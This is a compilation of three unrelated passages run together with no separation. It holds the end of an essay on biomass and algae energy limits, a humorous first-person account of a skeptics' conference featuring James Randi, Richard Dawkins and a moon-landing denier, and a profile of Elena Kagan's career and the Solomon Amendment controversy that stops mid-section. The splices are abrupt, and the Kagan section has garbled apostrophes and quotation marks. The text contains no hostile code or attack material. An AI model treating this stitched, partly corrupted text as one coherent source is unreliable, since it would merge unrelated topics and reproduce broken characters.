Closed - system approaches , where algae are grown in a sealed tank that is supplied with carbon dioxide and nutrients in a controlled fashion have produced promising results in the lab , but have equally faced difficulties scaling up to a meaningful size .
The key problems continue to be stability and long - term returns , plus the high cost of creating a clean and closed environment , which can be compared to gigantic petri-dishes with a lid .
The key issue with closed - system approaches is that the only input we do n’t have to provide from the outside the system is the sunlight ; everything else needs to be produced , supplied and managed directly .
Producers must use inexpensive sources of nutrient supplies , especially N , P , and K , to keep biofuels from algae cost - competitive .
Higher quality sources may compete directly with inputs into our agricultural system .
Closed systems require constant monitoring and precise application of nutrients as well .
Too little of an additive and the crop will fail to produce ; too much may render the growing medium toxic – or lead to issues with waste water disposal .
Recycling the growth medium and wastewater from algal plants is possible , but expensive and energy intensive .
Usually , this does n’t bode well for EROIs , despite potentially higher yields and lower environmental impact .
These are the two approaches tried for algal photosynthesis .
As with any yet unproven technology , promises are high , but equally are risks , and most seem insurmountable to us , or only at the cost of large energy inputs to maintain stability in a scaled - up facility .
One other use of algae is not so much for the creation of new biomass ( autotrophic ) , but instead for a heterotrophic way where algae do not need sunlight but instead are fed carbohydrates ( from plants ) and convert them into lipids , thus creating an almost fuel - type input .
While this system might actually increase the efficiency conversion of – say – corn to a biodiesel product , it does not change the primary requirement for growing more biomass on land .
It is important not to confuse the two approaches , as this one does n’t overcome the limits of growing biomass on land .
And again , it will suffer from similar problems with scalability .

Dimitrov ( 2007 ) – A Case Study
What about waste ?
IIER ’s European offices are in Switzerland , the country that has abandoned most landfills , and instead burns more than 95 % of its non-recyclable flammable waste ( including outputs from wastewater treatment ) to generate energy or process heat .
Overall process efficiency for combined heat and electricity generation ( for which about 70 % of total waste is used ) is approximately 42 % ( in German ) , which includes energy for internal use of the waste power plants .
Using Switzerland as an example , from the original energy content , 35 % can be extracted as energy for external use ( 24 % as heat , 11 % as electricity ) , about 6 % are used for the operation of processing facilities .
Technology feasibility studies show that net electricity production might be slightly increased to probably 15 % of total energy content .
What is important to know is that those waste plants work best and most efficient when producing base load at a high load factor of close to 90 - 100 % .
They are – like other entities burning biomass – not really capable of modulating easily below a 60 % level , as total fuel is so heterogeneous and needs a constant level of heat to burn properly .
When applying today ’s Swiss technology to the U.S. , converting 232 million metric tons of waste to energy at the above rates , this would deliver approximately 119 TWh ( 0.4 quads ) of base load electricity ( at 15 % efficiency ) , which is nothing more than 3 % of today ’s electricity consumption , and 0.65 quads of usable heat energy ( at 25 % efficiency ) .
So what is the true biomass potential for energy ?
Based on all the above assumptions , we have tried to establish our own best case for future potential biomass extraction .
We assume a significant realignment of land for growing energy crops ( or algae ) , steady doubling of outputs from some of the switches , and a much more efficient energy conversion process compared to today ’s best - in - class technologies .
Our model operates with the following assumptions , which even require hard decisions by people , e.g. the reduction in consumption of animal protein : - Reassignment of all corn land used for biofuels ( mostly corn ) to a better biomass producing crop , doubling the output per acre
Reassignment of 1/3 of animal fodder producing cropland to a good biomass producing crop with a doubled biomass output per acre
Reassignment of 10 % of the best pasture land yielding biomass similar to today ’s corn output from crop land ( or alternatively assigning land for algal biofuel )
Raise meaningful forest energy extraction by 0.5 quadrillion BTU
Conversion to usable fuels comparable to today ’s fossil fuels at an average 50 % efficiency
Biomass production with a total EROI of 6:1 ( based on net final fuel inputs )
Table 8 : gross and net increases in biomass production ( in quadrillion BTU )
With these rather radical steps , we would expect today ’s biomass gross energy extraction could be increased from 3.4 quads to 9.8 quads .
However , as this energy is in “ low quality ” form , converting it to useful inputs ( like combustion fuels or methane ) will likely yield only 40 % of that gross amount , e.g. 3.9 quads in this scenario .
The above 9.8 quads ( gross ) or 3.9 quads ( net ) are what we can expect as biomass output per annum .
This does not take into account the required energy and material inputs into production .
In a future scenario where farms are self - sustained , these inputs would have to come from biomass once again , which would reduce net available energy even further .
The 9.8 or 3.9 quads are only available as long as we mostly have fossil fuels as inputs into agricultural production .
Flexibility of biomass in electricity generation
Biomass ( and waste ) have been repeatedly quoted as a source of flexible electricity generation .
As already described in the section about waste , biomass is – when burned directly – mostly capable of providing base load energy , as the flexibility of burning wood at relatively low temperatures is very limited .
Also , a storage problem will make it unrealistic to keep biomass as a flexible source for ( long term ) bridging of gaps in other renewable production .
This is due to the low energy density of cellulosic biomass when compared to its fossil competitors .
One feasible alternative is the conversion of biomass to methane .
However , this process that uses two steps ( fermentation first , then burning ) shows low conversion efficiency , turning an already small amount of energy in biomass into an even smaller amount of electricity .
Conclusion
In this part of our series of posts , we have revisited biomass potential as a contributor to future human energy systems .
Until now , we only use biomass as a by - product of other uses and / or in subsidized ways ( both by money and fossil fuels ) at very small scales compared with total energy consumption .
Increasing our biomass production is going to be problematic in many ways , and not just in the conversion from biomass to fuel , as with cellulose , but more so with the generation of enough biomass in the beginning , where we think it farfetched to produce much more than we do today .
Overall , we come to the following conclusions :
Theoretical biomass production potential is high , but can only partly be ( further ) diverted towards human uses and is limited by inputs , diminishing returns on marginal land , competition with food production
Even if a meaningful production of biomass can be achieved , this is at the expense of high inputs ( low net energy extraction ) , and the resulting output requires refinement to usable fuels in processes with relatively low efficiencies
In a world with expensive and scarce resources , farmers may need to return to providing a portion of their own energy to grow crops .
This may result in improved sustainability of farming , but limits the alternative uses for this biomass - derived energy .
So even if we can double current extraction of biomass , this only represents approximately 6 % of total U.S. primary energy consumption , and will never be enough to serve as a meaningful stabilizer in future energy systems .

I ’m standing in a lukewarm hot tub with 30 atheists .
A big guy named Rick is teaching me the history of the modern Skeptic Movement .
He ’s explaining how magician James Randi and biologist Richard Dawkins have debunked psychics , mind readers , remote viewers , astrologers , homeopathists , acupuncturists and God .
This , I imagine , is how the Sophists must have felt — philosophizing in crowded Greek bathhouses as the fingers and toes prune .
Then again , the pre-Socratic philosophers spent their time forming hippy dippy theories ( “ All things come from water , ” “ Everything is in flux ” ) , and the modern Skeptics spend their time picking those theories apart .
Last week , 1,320 Skeptics gathered to Las Vegas to disprove , discuss , debate , and inquire .
They were joined by a man who swore the moon landing was faked , a man who claimed he could cure terminal diseases over the phone , and 1 million pissed - off ghosts .
So did this motley crew play nice ?
The answer might surprise you ...
Part One : Richard Dawkins , James Randi , and Some Random Guy With No Identification
It ’s Thursday afternoon and I ’m pulling into the South Point parking garage .
I ’m heading to The Amaz !ng Meeting ( TAM ! ) : A Celebration of Critical Thinking and Skepticism .
It ’s the eighth annual meeting .
And I ’m running late .
The Richard Dawkins press conference is supposed to start in 10 minutes , and I have n’t even parked , let alone walked through the casino and to the convention hall , let alone checked in at the press registration table , let alone fired up my laptop up and typed up some clever questions .
Oh , I ’ve scraped by with dumb ones in the past , but Richard Dawkins topped Prospect magazine ’s list of Top 100 British Intellectuals , so clever queries were de rigueur .
I double - time through the casino , breeze through the registration process — nobody asks for ID — and locate the room in which the press conference is set to take place .
I take a seat next to a young man holding a giant crystal ball in his lap .
I deduce that he ’s not a “ genuine ” fortune teller ( i.e. , one who genuinely claims to tell fortunes ) , but a Skeptic pretending to be one .
Presumably , to show how silly fortune tellers are .
“ Do you know what I ’m going to ask Dawkins ? ” I say to the pseudo seer , secretly hoping he ’ll write my questions for me .
“ You plan to ask Dawkins ... ” — the mock oracle stares into his ball and squints his eyes — “ questions pertaining to skepticism . ”
Thanks for nothing , Nostradamus .
Dawkins , author of The God Delusion , enters the room wearing a light - brown blazer over an open - collared shirt .
Within minutes , he ’s fielding questions about arresting the pope and why American political leaders have to end their speeches with “ God bless America . ”
And then it ’s my turn to ask something .
Here ’s what I come up with :
“ When I checked in to the conference , they did n’t ask for my press credentials or for my drivers license or anything .
They just gave me this press badge and let me in .
Do you think they should have been more skeptical ? ”
Seemed like an appropriate question to ask at a Skeptics meeting .
“ You think you should have been frisked for fear that you were armed ? ” Dawkins replies .
A couple people snicker , but Dawkins goes on : “ I think it ’s a rather nice characteristic to be trusting .
We live in a deeply mistrustful world .
And when you go though airport security , as I do , you get the feeling that the world runs on mistrust .
I get the feeling , when I remove my shoes , that bin Laden has won .
I think I ’d rather take my chances in being blown up .
So maybe we in the Skeptic movement are very trustful .
It ’s an interesting paradox that you possibly may have unearthed . ”
When I asked the question , I was n’t thinking about violence .
What I ’d meant was , Do you think TAM !
organizers should be more concerned about freeloaders skipping the $ 425 registration fee ?
But it ’s not surprising that Dawkins interpreted the question the way he did .
He ’s not only one of the smartest guys in the world ; he ’s also one of the most controversial .
Crudely put :
There are people who would like to see him dead .
Having casually unearthed a mind - shattering paradox — this according to Britain ’s No. 1 intellectual !
—I exit the press conference and walk through the convention hallway .
I see skeptical conventioneers wearing T - shirts from previous TAM !
gatherings , from the Center For Inquiry , and from SkeptiCamp .
Everybody is talking about the Million Ghost March .
Apparently , to protest this year ’s TAM ! , mediums from across the globe have called upon 1 million dead souls to haunt South Point .
Word is , the mediums specifically called upon the ghosts of Michael Jackson , Liberace and Hunter S. Thompson .
A young conventioneer tells me the Million Ghost March is a joke , originally posted on a Skeptic - friendly , Onion - like website ( and then reposted on woo - woo websites that did n’t get the joke ) , but before I can investigate further , I ’m told that James Randi , the man responsible for the whole convention , is ready for our interview .
James “ The Amazing ” Randi has spent 70 years performing magic and investigating paranormal claims .
As a lifelong magician myself , I was honored to spend some one - on - one time with the prolific Kris Kringle dead ringer .
“ Does being a magician make you more skeptical , or are Skeptics attracted to magic ? ” I ask .
“ The first one , ” Randi replies .
“ It makes you more skeptical .
Magicians see how easily people are fooled and how quickly people make assumptions .
Let me give you an example ... ”
Randi crumples up his cocktail napkin with his right hand .
He takes it with his left .
He readjusts .
Then he opens his left fist .
The napkin is gone .
“ We all make assumptions , ” Randi continues , “ and often our assumptions are wrong .
You assumed that I transferred the napkin from my right hand to my left — in part because I was looking at my left hand — but I actually kept it in my right hand the whole time . ”
Well , Randi may have assumed that I assumed that he put the crumpled up napkin in his left hand , but in actuality , I knew that he did n’t .
See , I ’ve been performing false transfers myself for 22 years , so I know one when I see one .
Of course , Randi ’s assumption about my assumption only proves his initial point : we all make faulty assumptions .
Happens to the best of us .
Randi and I were n’t the only magicians at TAM !
The current President of the James Randi Educational Foundation ( JREF ) is a magician ( DJ Grothe ) , the TAM !
press manager is a magician ( Austin Luton ) , and three of the TAM !
lecturers / performers are magicians ( Michael Weber , Johnny Thompson , Jamy Ian Swiss ) .
Penn &
Teller could n’t make this year ’s TAM ! , but even the most skeptical Skeptic would n’t question their skeptic street cred .
Five nights a week , Penn & Teller perform a “ mind reading ” illusion in which they satirize the tactics commonly used by psychics , mediums , and so - called body language readers .
During the trick ,
Penn delivers the line , “ All psychics , mind readers , and mediums are , without exception , bullshit .
Their tricks are evil and immoral . ”
And when he does , the audience bursts into applause .
So you have to wonder : Do Penn & Teller have a self - selecting audience ( i.e. , Do only Skeptics see their show ? ) , or do average Americans like Skeptics now ?
Are the tides turning against Sylvia Browne , John Edward and Uri Geller , and toward James Randi and Richard Dawkins ?
Perhaps .
But still , not everybody is on the same page ...
Part Two : The MythBusters vs. The Moon Hoaxer
Adam Savage , co-host of Discovery Channel ’s MythBusters , just finished his lecture , which involved being good even while lacking belief in the supernatural .
The Skeptics are pouring out of Ballrooms A & B .
But they ’re not talking about Savage ; they ’re taking about “ the moon hoax guy . ”
“ What was that moon kid ’s problem ? ” one Skeptic asks .
“ Do you think the moon hoax guy flew all the way from Australia just to do that ? ” asks another .
I do n’t need a mind reader to tell me who the “ moon hoax guy ” is ; he ’s the one everyone is pointing at .
He looks just over 20 and he ’s got a moustache and he ’s wearing a black suit .
Everybody ’s talking about him , but nobody is talking to him .
So I walk up and introduce myself .
His name is Jarrah White .
He describes himself as “ The Grandson of Apollo Hoax Theory . ”
He believes the Apollo moon landing video was faked .
He believes we ’ve never been to the moon .
He believes we ca n’t go to the moon because the radiation would kill us along the way .
In other words , White is a skeptic .
But he ’s a skeptic with a lower - case “ s ” — he ’s not really part of the Skeptic community .
According to JREF president DJ Grothe , “ Skeptics have little in common with ‘ moon hoaxers ’ and other conspiracy theorists because we in the Skeptical community are open to evidence and to changing our minds .
Moon hoaxers , Birthers [ those who believe Obama is not American ] and Truthers [ those who believe 9/11 was an inside job ] form conclusions from which no amount of evidence can dissuade them . ”
I ask Jarrah “ Grandson of the Apollo Hoax ” White about what went on during Savage ’s lecture .
Before he answers , he pulls out a dictation machine from his pocket .
He wants to make sure I do n’t misrepresent his position or misquote him .
We take a seat on a bench and I do my best to type White ’s exact words as they come from his mouth .
He looks over my shoulder , at my computer screen , as I type , which only lowers my accuracy .
“ I ’m interested in the moon landing conspiracy , ” White says .
“ MythBusters did a program where they disproved some of the theories advocated by moon landing hoaxers — those of us who do n’t believe we ’ve actually landed on the moon — and during Adam ’s speech , I pointed out that he botched his exposé . ”
“ How so ? ” I ask .
“ The conspiracy theory is this : The ‘ astronauts ’ were filmed on wires , on a film set .
And then the footage of them on the wires was slowed down .
The MythBusters disproved the wires and slow motion separately .
They never combined the two . ”
“ And you got the mic and said this during Adam ’s speech ? ” I ask .
“ Right . ”
“ And did he cede that point ? ”
“ Yes . ”
I could n’t understand what all the fuss was about .
It sounded like White made a simple point and Savage agreed to it .
To see whether there ’s more to the story , I walk into the green room , and ask Savage himself .
Turns out there is more to the story .
“ My complaint was n’t with what he said during the speech ; ” Savage tells me , “ my complaint was what he did afterwards . ”
“ What did he do ? ”
“ He monopolized me .
He kept asking more and more questions , and he saw that there were a hundred people standing around , trying to ask me their own questions and trying to get autographs , but he would n’t let any of them get a word in .
I did n’t come to TAM ! to appease any one guy . ”
“ Does this sort of thing happen everywhere you go ? ” I ask .
“ That was the first time , actually .
I just got my irate fan cherry busted ! ”
“ And do you think his main point has any merit ? ”
“ Moon landing deniers claim a hundred different things , and on that list , one is wires , one is slowed down tape , and one is wires & slowed down tape .
When we shot the show , we made choices about what we ’d use to produce a reasonable narrative .
We could n’t address all 100 moon hoax conspiracies . ”
I walk out of the green room and find White still on the bench .
A group of Skeptics has gathered around him , and they ’re debating the specifics of the Apollo video .
One of the Skeptics asks White , “ How do you respond to the reflectors ? ” And White responds to the reflectors .
“ Are you an atheist ? ” asks another , presumably attempting to judge White ’s place at the convention .
White says that he is an atheist , and that answer seems to surprise everybody .
After the Skeptics dissipate , I ask White why he flew in all the way from Australia to make this point to Savage .
I ask why he spends his life trying to convince people that the moon landings were faked .
( White ’s got a website , a YouTube channel , etc. )
“ It ’s important to get the truth out , ” he says .
“ But you said you ’re an atheist , too .
And a lot of people believe that God exists .
So why do n’t you spend your time on the God issue ?
Why is the moon one so much more important to you ? ”
That question gives
White pause .
( None of my others did ) .
After the pause , he tells me that he wanted to be an astronaut as a kid .
Ah .
See ,
White never became an astronaut .
And now , it ’s too late for him .
So , I could speculate that after White was first told that he could n’t become an astronaut — for this reason or that — he became envious of those astronauts who ’d already flown into space and to the moon .
I could then speculate that White ’s emotion led his intellect — i.e. ,
If I ca n’t fly to the moon , then no one can ... or has ... and therefore , the moon landing must have been faked .
Any psychologist or trial lawyer will tell you :
The heart leads the mind .
Of course , the heart can lead the mind to the right place .
So even if my speculations are accurate , it does n’t necessarily make White wrong .
( What makes White wrong is the fact that we have been to the moon . )
Still , the Skeptics at TAM !
respect
White ’s dissenting opinion .
Perhaps because they identity with White .
Perhaps because they ’re usually the ones doing the dissenting .
At most meetings , the “ crazy ” guy is thrown out ( or tased ) after he asks his “ crazy ” question or makes his “ crazy ” point .
But not at TAM !
What follows White ’s “ crazy ” question ?
Discussion , debate and civility .
This respect continues throughout the whole conference .
During a panel on the paranormal , a man in the audience stands up , takes the mic , and claims that he can “ restore normal feelings and sensations ” to breast cancer survivors ... by looking at them .
He says that he can also cure illnesses over the phone .
I expect the audience to burst out laughing .
I expect Randi , who is on the panel , to make some sort of joke at this man ’s expense .
But I am wrong ; Randi takes the man ’s claim seriously :
“ This is eminently testable , ” Randi says .
“ We ’ll have to talk to a statistician to see how many cases we need to look into , and we ’ll have to talk to medical authorities , but we can work out a protocol for this test .
We will be in touch . ”
The audience applauds .
Randi is n’t just pretending to take this guy ’s claims seriously ; Randi is taking them seriously .
And that , I imagine , is the hardest part of being a lifelong Skeptic :
Whenever somebody comes forward with an unlikely - sounding claim , you ca n’t dismiss it outright just because you ’ve heard similar bogus claims in the past .
Because if you do , if you judge before you investigate , then you ’re not much better than the guy who believes everything he hears .
Below , we discuss the most significant aspects of Elena Kagan " ™s experience and writings as they relate to the Supreme Court .
We also consider various criticisms that have been raised against Kagan , including with respect to her views on the military ( supposedly too liberal ) and executive power ( supposedly too conservative ) , as well as the prospect that she will be required to recuse from a substantial number of cases early in her tenure on the Court .
We separately discuss the specific votes she likely will receive for and against her confirmation .
Each separate section below is identified by its author(s ) .
Our goal is to provide information for the public to make its own judgments , and we also offer opinions on certain claims made about her .
We do not discuss the reasons I think the President is most likely to appoint her , which are discussed in earlier posts .
But in general , here are the highlights :
Kagan is uniformly regarded as extremely smart , having risen to two of the most prestigious positions in all of law : dean of Harvard Law School and Solicitor General .
In government and academia , she has shown a special capacity to bring together people with deeply held , conflicting views .
On a closely divided Supreme Court , that is an especially important skill .
Conservatives who she has dealt with respectfully ( for example , Charles Fried and former Solicitors General to Republican Presidents ) will likely come forward to rebut the claim that she is an extreme liberal .
She would also be only the fourth woman named to the Court in history , and President Obama would have named two .
At age 50 , she may serve for a quarter century or more , which would likely make her the President " ™s longest lasting legacy .
As with John Roberts , her service in a previous presidential Administration exposed her to a number of decisionmakers , who have confidence in her approach to legal questions .
The fact that she lacks a significant paper trail means that there is little basis on which to launch attacks against her , and no risk of a bruising Senate fight , much less a filibuster .
And finally , one point is often overlooked : Kagan had some experience on Capitol Hill and significant experience in the Executive Branch , not only as an attorney in the White House counsel " ™s office , but also as an important official dealing with domestic affairs .
She has thus worked in the process of governing and does not merely come from what has recently been criticized ( unfairly , in my view ) as the " judicial monastery . " 
Summary Biography [ by Tom Goldstein ]
Elena Kagan was born on April 28 , 1960 in New York .
She attended Hunter College High School , Princeton ( graduating in 1981 ) , and Harvard Law School ( graduating in 1986 ) .
Kagan clerked for Judge Abner Mikva of the D.C. Circuit , then for Justice Thurgood Marshall in the Court " ™s 1987 Term .
Upon completing her clerkship , in 1988 , Kagan went to work as an associate at Williams & Connolly in Washington , D.C .
In 1991 , Kagan joined the law faculty of the University of Chicago .
She principally taught administrative and constitutional law .
During this period , she met Barack Obama , who was also teaching at the law school .
In 1993 , Kagan temporarily served as special counsel to Senator Joe Biden ( then - Chairman of the Judiciary Committee ) during the confirmation process of Justice Ruth Bader Ginsburg .
She then returned to teaching at Chicago .
In 1995 , Kagan joined the Clinton Administration .
Initially , she served as Associate White House Counsel .
In 1997 , she was named Deputy Assistant to the President for Domestic Policy and Deputy Director of the Domestic Policy Council .
In 1999 , President Clinton nominated Kagan for a judgeship on the D.C. Circuit .
She never received a hearing , however .
In 1999 , Kagan returned to academia , accepting a position on the law faculty at Harvard ( initially as visiting professor , and then as a permanent member of the faculty ) .
She principally taught administrative law , civil procedure , constitutional law , and a seminar on the presidency .
In 2001 , she received tenure .
In 2003 , she was named the dean of the law school , succeeding Bob Clark , as well as the Charles Hamilton Houston Professor of Law .
Her Harvard faculty page is here .
President Obama nominated Kagan to serve as his first Solicitor General , and she was confirmed in 2009 by a vote of 61 - 31 .
In 2009 , the President considered and interviewed Kagan for a potential nomination for the Supreme Court seat vacated by David Souter to which Sonia Sotomayor was ultimately named .
Academic Career [ by Erin Miller ]
Kagan has published six scholarly law review articles , all of which predate her receiving tenure at Harvard in 2001 .
Her earlier articles focus on First Amendment doctrine , while the last two discuss administrative law .
She has also published numerous book reviews , encyclopedia entries , and tributes to figures in the law .
In her most widely cited free speech paper , " Private Speech , Public Purpose : The Role of Governmental Motive in First Amendment Doctrine , "  published in 1996 in the University of Chicago Law Review , Kagan contends that the primary purpose of courts reviewing speech restrictions should be to ferret out impermissible governmental motives–not necessarily to protect individual expression or the marketplace of ideas .
The Chicago paper builds on the arguments she made in two earlier papers on the Supreme Court " ™s 1992 decision in R.A.V. v. St. Paul , which struck down a city ordinance banning certain " bias- motivated "  conduct .
In one , she argues that when government is under no imperative to prohibit or endorse any speech , it cannot selectively do so based on the viewpoint of that speech .
In the other , she argues that the Court can still regulate pornography and hate speech under her interpretation of the First Amendment .
Kagan " ™s 2001 article " Presidential Administration , "  published in the Harvard Law Review , was named the year " ™s top scholarly article by the American Bar Association " ™s Section on Administrative Law and Regulatory Practice .
Declaring an " era of presidential administration , "  the paper examines how the three previous presidents exercised increasingly direct authority over federal agencies ; she argues that in this way , Bill Clinton " “ unlike his de-regulatory predecessors " “ advanced his own progressive and pro-regulatory political agenda .
In a 1995 review of Stephen Carter " ™s book on confirmation hearings , " Confirmation Messes , Old and New , "  Kagan criticized senators for failing to ask , and nominees for refusing to answer , questions about their views on specific issues .
Senators ought to dig deeply , she contended , asking straightforward questions about both the nominee " ™s judicial philosophy and her substantive views on constitutional issues :
" The critical inquiry as to any individual similarly concerns the votes she would cast , the perspective she would add ( or augment ) , and the direction in which she would move the institution "  ( 934 ) .
Nominees could be asked about their views on particular issues that the Court regularly faces , such as " privacy rights , free speech , race and gender discrimination , and so forth "  ( 936 ) .
On this view , a nominee ought to refrain only from expressing a " settled intent "  to vote a particular way on a particular case that might come before her .

Tenure as Dean [ by Anna Christensen ]
During her tenure as dean of Harvard Law School , from 2003 until her appointment as Solicitor General in 2009 , Kagan spearheaded a number of significant changes to the school " ™s curriculum , faculty , budget , and student life , establishing herself as an immensely popular leader and garnering significant goodwill from students and faculty alike .
As dean , Kagan oversaw Harvard Law School " ™s " Setting the Standard "  fundraising campaign , which she inherited upon her appointment .
When the campaign ended in 2008 , it had raised over $ 476 million , making it the most successful fundraising effort in the history of legal education .
Kagan also undertook a substantial effort to revise and update the law school curriculum .
In particular , she introduced a new first - year curriculum to replace the one that had been in use for over one hundred years ; added new legal clinics , including a Supreme Court advocacy project ; and increased the school " ™s academic commitment to environmental law and public service .
She also added a new $ 150 million academic center and contributed to efforts to make Harvard Law School " ™s campus more environmentally friendly .
Kagan " ™s time as dean is perhaps best known for shifts in the composition of and relationships among the law school " ™s faculty ( including particularly among conservatives and liberals ) .
Despite strong opposition from certain faculty members , Kagan supported the hiring of Jack Goldsmith , a former Assistant Attorney General in the Office of Legal Counsel who at the time was criticized for his perceived role in authoring the Bush Administration " ™s wartime interrogation policy .
She is credited with improving faculty relations significantly , ending decades of feuding between some professors .
She also added a number of high - profile academics to the school " ™s faculty , often luring these professors from other prestigious law schools .
And Kagan introduced a program aimed at bridging the gap between legal practice and academia by hiring practicing attorneys for associate or temporary professorships .
Among the smaller - scale changes brought about by Kagan during her tenure as dean , she is perhaps best - known for her commitment to improving student life on campus .
In her first few years at Harvard , Kagan introduced free coffee and bagels for students , renovated the law school " ™s student center , added a multipurpose ice rink and a volleyball court , and improved the gymnasium .
She explained her emphasis on these small - scale improvements as resting on her belief that " small , symbolic policies could help solve big problems . " 
The Solomon Amendment [ by Tom Goldstein ]
Kagan " ™s deanship at Harvard was marked by her role in the controversy over the University " ™s response to the Solomon Amendment .
The relevant timeline follows .
In 1979 , Harvard Law School adopted an anti-discrimination policy requiring any employer using the Office of Career Services for recruiting to sign a statement indicating that it did not discriminate on the basis of sexual orientation or certain other criteria ; pursuant to that policy , the law school banned military recruiters from using the Office of Career Services .
At some point between 1979 and 1992 , the school permitted recruitment through a student group , the HLS Veterans Association .
( That group was founded in 1985 ; it is possible another group was involved earlier . )
Under that policy , the recruiters used the same physical facilities , but were denied recognition under the law school " ™s career placement processes .
In 1996 , Congress passed the Solomon Amendment , which blocks federal funding for schools which refuse to allow military recruitment on campus .
The Amendment was passed in response to the refusal of many schools , including Harvard , to allow recruiters on campus on the ground that the military " ™s " don " ™t ask , don " ™t tell "  policy violated the schools " ™ nondiscrimination policies .
Harvard does not appear to have changed its policy , likely regarding it as sufficient that the military was able to recruit through the student veterans group .
Alternatively , the school may have concluded that it was not subject to the Solomon Amendment because the law school itself did not receive federal funding .
In 2002 , the Department of Defense issued a ruling that the law school " ™s recruitment policy would trigger the loss of federal funding for all of Harvard University " “ $ 328 million .
The law school relented by making an exception to its nondiscrimination policy and allowing the military full access to recruitment processes .
In 2003 , Kagan was named dean of the law school .
She maintained the existing policy .
Also in 2003 , a consortium of law schools and faculty members " “ the Forum for Academic and Institutional Rights ( FAIR ) " “ challenged the Solomon Amendment on constitutional grounds .
Although Harvard Law School was not a member of FAIR , in 2004 , Kagan joined fifty - three other faculty members in signing an amicus brief in support of FAIR , but arguing that the case should be resolved on statutory grounds ( as opposed to FAIR " ™s constitutional challenge ) .
In November 2004 , a divided panel of the Third Circuit ruled in FAIR " ™s favor , but the ruling was stayed pending Supreme Court review of the case .
Immediately after the Third Circuit " ™s ruling , Kagan reinstated Harvard Law School " ™s prior policy : banning the military from using the main career office , but permitting access through the student veterans group .
The veterans group responded that it would attempt to coordinate recruitment to some extent by email , but it cautioned that it had " declined interim options to establish formal liaison relationships , sponsor regular on - campus military recruiting fairs , coordinate interviews extensively , or perform other equivalent functions .
Given our tiny membership , meager budget , and lack of any office space , we possess neither the time nor the resources to routinely schedule campus rooms or advertise extensively for outside organizations , as is the norm for most recruiting events .
Moreover , such copious involvement would dramatically constrict our ability to organize other , non-recruiting events .
The above email address falls short of duplicating the excellent assistance provided by the HLS Office of Career Services .
We sincerely hope , however , that it satisfies some needs of our interested classmates and that they feel entirely comfortable in approaching us as peers . " 
When the federal government responded by threatening to withhold all federal aid from Harvard , Kagan rescinded the prohibition .
Kagan wrote the following to the student body at the time : " I have said before how much I regret making this exception to our antidiscrimination policy .
I believe the military " ™s discriminatory employment policy is deeply wrong " “ both unwise and unjust .
And this wrong tears at the fabric of our own community by denying an opportunity to some of our students that other of our students have .
The importance of the military to our society " “ and the great service that members of the military provide to all the rest of us " “ heightens , rather than excuses , this inequity .
The Law School remains firmly committed to the principle of equal opportunity for all persons , without regard to sexual orientation .
And I look forward to the time when all our students can pursue any career path they desire , including the path of devoting their professional lives to the defense of their country . " 
The government successfully petitioned for certiorari .
In the Supreme Court , Kagan joined thirty - nine other law professors in signing an amicus brief in support of FAIR .
The Supreme Court subsequently upheld the Solomon Amendment , rejecting the position of FAIR and its amici ( including Kagan ) , unanimously .
After stating that the law school would of course follow the Court " ™s ruling , Kagan wrote : " At the same time , I hope that many members of the Harvard Law School community will accept the Court " ™s invitation to express their views clearly and forcefully regarding the military " ™s discriminatory employment policy .
As I have said before , I believe that policy is profoundly wrong " ” both unwise and unjust " ” and I look forward to the day when all our students , regardless of sexual orientation , will be able to serve and defend this country in the armed services . " 
Some commentators have claimed that Kagan " ™s position on the Solomon Amendment reflects an anti-military bias .
That criticism is unsound .
Harvard " ™s position " “ which predates Kagan " ™s tenure as dean " “ was not directed at the military but instead is a categorical nondiscrimination rule applicable to all potential employers .
It is a position that is widely shared among American law schools .
It is fair to infer from the fact that Kagan did not attempt to repeal Harvard " ™s policy , and instead implemented it in full in the wake of the Third Circuit " ™s ruling despite the stay of the mandate , and moreover wrote to the student body in unambiguous terms , that Kagan personally supports the policy in full .
But that is just to say that Kagan believes in the principle of nondiscrimination , including with respect to homosexuals .
There is no evidence that Kagan harbors any hostility towards the military .
She hosted dinners at Harvard for veterans .
Her email to the student body , quoted above , takes care to state her respect for the military , a topic about which she has spoken clearly .
For example , when she was invited to give the distinguished Evening Lecture at West Point ( available here ) , General Kagan explained that she was " in awe of [ the cadets " ™ ] courage and dedication "  and recognized that " my security and freedom and indeed everything else I value depend on all of you . " 
Kagan explained that in light " of the vital role the military plays in the well - being of the country , "  she was " grieved "  at the conflict between the military and law schools , including her " personal [ ] "  belief " that the exclusion of gays and lesbians from the military is both unjust and unwise . " 
It was precisely because of her respect for the military that she " wish[ed ] devoutly that these Americans could join this noblest of all professions and serve their country in this most important of ways . " 
Confirmation as Solicitor General [ by Erin Miller ]
Kagan " ™s confirmation hearing was not particularly contentious .
Probing questions focused on two issues :
Would she defend statutes to which she was personally opposed ?
And was she qualified for the position given her inexperience as an advocate ?
To the first concern , Kagan repeatedly affirmed that personal qualms about a statute would never prevent her from enforcing it :
“ When one assumes the Solicitor General ’s role , one is assuming a set of responsibilities –a set of obligations –of which the defense of statutes is one of the most critically important .
And you defend those statutes whether you would have voted for those statutes or not . ”
She would have defended the Solomon Amendment , she explained , because “ of course there was a reasonable basis ” for it .
Senators Tom Coburn and Arlen Specter wondered whether Kagan would defend statutes against the president ’s will .
Kagan replied that she would almost certainly do so , given that presidential opposition would seldom undermine the legal basis for a statute .
The one , narrow exception might be if the statute infringed on a “ core ” presidential function .
Here she recited the framework of presidential power articulated in Youngstown Sheet & Tube v. Sawyer , which deems that power at its “ lowest ebb ” when Congress has spoken against it .
Answering the second concern about her lack of experience in legal practice , Kagan cited among her qualifications to be Solicitor General her “ judgment as opposed just to book learning ” and her “ lifetime of learning and study of the law , and particularly of the constitutional and administrative law issues that form the core of the Court ’s docket . ”
During the hearing , Kagan distanced herself from some views expressed early in her career that will likely give rise to questions again if she is nominated to a seat on the Supreme Court .
Kagan called a memorandum that she wrote as a law clerk to Justice Thurgood Marshall “ the dumbest thing I ever read . ”
“ Let me step back a little if I may and talk about my role in Justice Marshall ’s chambers …
We wrote memos on literally every single case in which there was a petition …
I do n’t want to say there is nothing of me in these memos , but I think in large measure these memos were written in the context of –you ’re an assistant for a justice , you ’re trying to facilitate his work , and to enable him to advance his goals and purposes as a justice …
I was a 27 - year - old pipsqueak and I was working for an 80 - year - old giant in the law and a person who–let us be frank –had very strong jurisprudential and legal views … and he was asking us in the context of those cert .
petitions to channel him , and to think about what cases he would want the Court to decide … ”
Kagan also said “ I ’m not sure that , sitting here today , I would agree ” with her prior position ( stated in the book review quoted above ) that Supreme Court nominees should answer questions about their substantive legal views and even possible votes .
Another noteworthy exchange involved executive power .
